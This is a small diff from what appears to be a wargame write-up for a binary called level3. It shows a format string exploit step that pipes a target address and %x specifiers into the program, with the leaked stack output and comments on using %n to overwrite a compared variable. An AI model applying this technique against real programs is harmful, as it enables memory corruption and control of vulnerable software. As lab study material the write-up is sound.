@@ -36,7 +36,7 @@ aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x20702520 # 0x61616161 is the hexa 
 
 # ”%n” 	Writes the number of characters into a pointer, So we will write at the adrr of the var we cmp (see l12)
 # The modifier format %x allow us to print address on the stack, cast on unsigned hexadecimal integer
-echo -e "\x8c\x98\x04\x08 %p %p %p %p" | ./level3
+python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' | ./level3
 � 0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c <- HERE
 
 # TIME TO GO BRRRRRR
